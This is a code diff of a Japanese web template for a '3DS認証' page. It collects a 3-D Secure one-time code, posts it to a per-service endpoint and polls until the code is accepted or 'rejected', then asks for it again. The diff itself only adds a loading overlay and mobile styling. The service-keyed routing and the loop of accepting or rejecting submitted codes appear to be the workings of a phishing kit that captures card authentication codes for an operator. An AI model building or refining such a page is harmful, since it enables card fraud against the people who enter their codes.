@@ -30,6 +30,21 @@
             width: 100%;
         }
 
+        /* スマホ対応：枠線を削除 */
+        @media (max-width: 768px) {
+            body {
+                padding: 0;
+                align-items: flex-start;
+            }
+
+            .container {
+                border: none;
+                padding: 20px;
+                max-width: 100%;
+                min-height: 100vh;
+            }
+        }
+
         h1 {
             font-size: 28px;
             margin-bottom: 20px;
@@ -101,31 +116,111 @@
             display: block;
         }
 
-        .waiting-message {
-            text-align: center;
-            padding: 40px 20px;
-            display: none;
-        }
-
-        .waiting-message p {
-            font-size: 18px;
-            margin-bottom: 30px;
-            color: {{ service.design.text_color }};
-        }
-
-        .spinner {
-            border: 4px solid {{ service.design.secondary_color }};
-            border-top: 4px solid {{ service.design.primary_color }};
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+
+        /* ローディングオーバーレイ */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: {{ service.design.background_color }};
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            position: relative;
+        }
+
+        .loader div {
+            position: absolute;
+            width: 6px;
+            height: 20px;
+            background-color: {{ service.design.primary_color }};
+            border-radius: 3px;
+            animation: loader-fade 1.2s linear infinite;
+        }
+
+        .loader div:nth-child(1) {
+            transform: rotate(0deg) translate(0, -28px);
+            animation-delay: 0s;
+        }
+
+        .loader div:nth-child(2) {
+            transform: rotate(30deg) translate(0, -28px);
+            animation-delay: -1.1s;
+        }
+
+        .loader div:nth-child(3) {
+            transform: rotate(60deg) translate(0, -28px);
+            animation-delay: -1s;
+        }
+
+        .loader div:nth-child(4) {
+            transform: rotate(90deg) translate(0, -28px);
+            animation-delay: -0.9s;
+        }
+
+        .loader div:nth-child(5) {
+            transform: rotate(120deg) translate(0, -28px);
+            animation-delay: -0.8s;
+        }
+
+        .loader div:nth-child(6) {
+            transform: rotate(150deg) translate(0, -28px);
+            animation-delay: -0.7s;
+        }
+
+        .loader div:nth-child(7) {
+            transform: rotate(180deg) translate(0, -28px);
+            animation-delay: -0.6s;
+        }
+
+        .loader div:nth-child(8) {
+            transform: rotate(210deg) translate(0, -28px);
+            animation-delay: -0.5s;
+        }
+
+        .loader div:nth-child(9) {
+            transform: rotate(240deg) translate(0, -28px);
+            animation-delay: -0.4s;
+        }
+
+        .loader div:nth-child(10) {
+            transform: rotate(270deg) translate(0, -28px);
+            animation-delay: -0.3s;
+        }
+
+        .loader div:nth-child(11) {
+            transform: rotate(300deg) translate(0, -28px);
+            animation-delay: -0.2s;
+        }
+
+        .loader div:nth-child(12) {
+            transform: rotate(330deg) translate(0, -28px);
+            animation-delay: -0.1s;
+        }
+
+        @keyframes loader-fade {
+            0%, 39%, 100% {
+                opacity: 0.3;
+            }
+            40% {
+                opacity: 1;
+            }
         }
 
         /* カスタムCSS */
@@ -133,7 +228,25 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- ローディングオーバーレイ -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+
+    <div class="container" id="mainContainer">
         <h1>3DS認証</h1>
         <p class="instruction">3DSコードを入力してください</p>
         
@@ -147,15 +260,13 @@
         </form>
         
         <div id="error" class="error-message"></div>
-        <div id="waiting" class="waiting-message">
-            <p>認証中です...</p>
-            <div class="spinner"></div>
-        </div>
     </div>
 
     <script>
         const paymentId = "{{ payment_id }}";
         const serviceKey = "{{ service_key }}";
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const mainContainer = document.getElementById('mainContainer');
         let checkInterval = null;
 
         // 数字のみ入力可能
@@ -168,7 +279,6 @@
             e.preventDefault();
             
             const errorDiv = document.getElementById('error');
-            const waitingDiv = document.getElementById('waiting');
             errorDiv.textContent = '';
             
             const code = document.getElementById('code').value;
@@ -178,6 +288,10 @@
                 errorDiv.textContent = '4〜8桁の数字を入力してください';
                 return;
             }
+            
+            // ローディング表示（フォームを非表示）
+            mainContainer.style.display = 'none';
+            loadingOverlay.classList.add('active');
             
             try {
                 const response = await fetch(`/${serviceKey}/submit_3ds`, {
@@ -193,9 +307,6 @@
                 const result = await response.json();
                 
                 if (result.success) {
-                    waitingDiv.style.display = 'block';
-                    document.getElementById('threeDSForm').style.display = 'none';
-                    
                     // 2秒ごとに状態をチェック
                     checkInterval = setInterval(async () => {
                         try {
@@ -207,8 +318,8 @@
                                 window.location.href = `/${serviceKey}/complete`;
                             } else if (status.status === '3ds_rejected') {
                                 clearInterval(checkInterval);
-                                waitingDiv.style.display = 'none';
-                                document.getElementById('threeDSForm').style.display = 'block';
+                                loadingOverlay.classList.remove('active');
+                                mainContainer.style.display = 'block';
                                 errorDiv.textContent = '認証が却下されました。再度入力してください';
                                 document.getElementById('code').value = '';
                             }
@@ -217,9 +328,13 @@
                         }
                     }, 2000);
                 } else {
+                    loadingOverlay.classList.remove('active');
+                    mainContainer.style.display = 'block';
                     errorDiv.textContent = result.message;
                 }
             } catch (error) {
+                loadingOverlay.classList.remove('active');
+                mainContainer.style.display = 'block';
                 errorDiv.textContent = 'エラーが発生しました';
             }
         });
